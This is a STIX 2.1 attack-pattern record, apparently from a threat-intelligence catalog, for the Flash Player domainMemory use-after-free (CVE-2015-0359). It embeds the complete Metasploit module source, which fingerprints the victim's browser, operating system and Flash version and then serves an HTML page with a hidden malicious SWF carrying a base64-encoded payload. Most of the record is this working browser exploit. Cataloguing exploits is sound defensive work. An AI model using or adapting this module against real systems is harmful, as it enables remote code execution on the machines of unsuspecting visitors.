{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ad833f19-04ba-402b-afab-65e4ef155c80",
    "created": "2024-08-14T16:44:17.934087Z",
    "modified": "2024-08-14T16:44:17.934091Z",
    "name": "Adobe Flash Player domainMemory ByteArray Use After Free",
    "description": " This module exploits a use-after-free vulnerability in Adobe Flash Player. The vulnerability occurs when the ByteArray assigned to the current ApplicationDomain is freed from an ActionScript worker, when forcing a reallocation by copying more contents than the original capacity, but Flash forgets to update the domainMemory pointer, leading to a use-after-free situation when the main worker references the domainMemory again. This module has been tested successfully on Windows 7 SP1 (32-bit), IE 8 and IE11 with Flash 17.0.0.134.  'License'             => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/adobe_flash_domain_memory_uaf.rb",
            "external_id": "adobe_flash_domain_memory_uaf.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2015-0359"
        },
        {
            "source_name": "reference",
            "url": "https://helpx.adobe.com/security/products/flash-player/apsb15-06.html"
        },
        {
            "source_name": "reference",
            "url": "https://www.fireeye.com/blog/threat-research/2015/04/angler_ek_exploiting.html"
        },
        {
            "source_name": "reference",
            "url": "http://malware.dontneedcoffee.com/2015/04/cve-2015-0359-flash-up-to-1700134-and.html"
        },
        {
            "source_name": "reference",
            "url": "https://git.hacklab.kr/snippets/13"
        },
        {
            "source_name": "reference",
            "url": "http://pastebin.com/Wj3NViUu"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::BrowserExploitServer\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'                => 'Adobe Flash Player domainMemory ByteArray Use After Free',\n      'Description'         => %q{\n        This module exploits a use-after-free vulnerability in Adobe Flash Player. The\n        vulnerability occurs when the ByteArray assigned to the current ApplicationDomain\n        is freed from an ActionScript worker, when forcing a reallocation by copying more\n        contents than the original capacity, but Flash forgets to update the domainMemory\n        pointer, leading to a use-after-free situation when the main worker references the\n        domainMemory again. This module has been tested successfully on Windows 7 SP1\n        (32-bit), IE 8 and IE11 with Flash 17.0.0.134.\n      },\n      'License'             => MSF_LICENSE,\n      'Author'              =>\n        [\n          'bilou', # Vulnerability discovery according to Flash Advisory\n          'Unknown', # Exploit in the wild\n          'hdarwin', # @hdarwin89 / public exploit (msf module is based on this one)\n          'juan vazquez' # msf module\n        ],\n      'References'          =>\n        [\n          ['CVE', '2015-0359'],\n          ['URL', 'https://helpx.adobe.com/security/products/flash-player/apsb15-06.html'],\n          ['URL', 'https://www.fireeye.com/blog/threat-research/2015/04/angler_ek_exploiting.html'],\n          ['URL', 'http://malware.dontneedcoffee.com/2015/04/cve-2015-0359-flash-up-to-1700134-and.html'],\n          ['URL', 'https://git.hacklab.kr/snippets/13'],\n          ['URL', 'http://pastebin.com/Wj3NViUu']\n        ],\n      'Payload'             =>\n        {\n          'DisableNops' => true\n        },\n      'Platform'            => 'win',\n      'BrowserRequirements' =>\n        {\n          :source  => /script|headers/i,\n          :os_name => lambda do |os|\n            os =~ OperatingSystems::Match::WINDOWS_7 ||\n              os =~ OperatingSystems::Match::WINDOWS_81\n          end,\n          :ua_name => lambda { |ua| [Msf::HttpClients::IE, Msf::HttpClients::FF].include?(ua) },\n          :flash   => lambda { |ver| ver =~ /^17\\./ && Rex::Version.new(ver) <= Rex::Version.new('17.0.0.134') },\n          :arch    => ARCH_X86\n        },\n      'Targets'             =>\n        [\n          [ 'Automatic', {} ]\n        ],\n      'Privileged'          => false,\n      'DisclosureDate'      => '2014-04-14',\n      'DefaultTarget'       => 0))\n  end\n\n  def exploit\n    @swf = create_swf\n    super\n  end\n\n  def on_request_exploit(cli, request, target_info)\n    print_status(\"Request: #{request.uri}\")\n\n    if request.uri =~ /\\.swf$/\n      print_status('Sending SWF...')\n      send_response(cli, @swf, {'Content-Type'=>'application/x-shockwave-flash', 'Cache-Control' => 'no-cache, no-store', 'Pragma' => 'no-cache'})\n      return\n    end\n\n    print_status('Sending HTML...')\n    send_exploit_html(cli, exploit_template(cli, target_info), {'Pragma' => 'no-cache'})\n  end\n\n  def exploit_template(cli, target_info)\n    swf_random = \"#{rand_text_alpha(4 + rand(3))}.swf\"\n    target_payload = get_payload(cli, target_info)\n    b64_payload = Rex::Text.encode_base64(target_payload)\n    platform_id = 'win'\n    os_name = target_info[:os_name]\n\n    html_template = %Q|<html>\n    <body>\n    <object classid=\"clsid:d27cdb6e-ae6d-11cf-96b8-444553540000\" codebase=\"http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab\" width=\"1\" height=\"1\" />\n    <param name=\"movie\" value=\"<%=swf_random%>\" />\n    <param name=\"allowScriptAccess\" value=\"always\" />\n    <param name=\"FlashVars\" value=\"sh=<%=b64_payload%>&pl=<%=platform_id%>&os=<%=os_name%>\" />\n    <param name=\"Play\" value=\"true\" />\n    <embed type=\"application/x-shockwave-flash\" width=\"1\" height=\"1\" src=\"<%=swf_random%>\" allowScriptAccess=\"always\" FlashVars=\"sh=<%=b64_payload%>&pl=<%=platform_id%>&os=<%=os_name%>\" Play=\"true\"/>\n    </object>\n    </body>\n    </html>\n    |\n\n    return html_template, binding()\n  end\n\n  def create_swf\n    path = ::File.join(Msf::Config.data_directory, 'exploits', 'CVE-2015-0359', 'msf.swf')\n    swf =  ::File.open(path, 'rb') { |f| swf = f.read }\n\n    swf\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-04-14",
    "x_mitre_platforms": [
        "win'"
    ]
}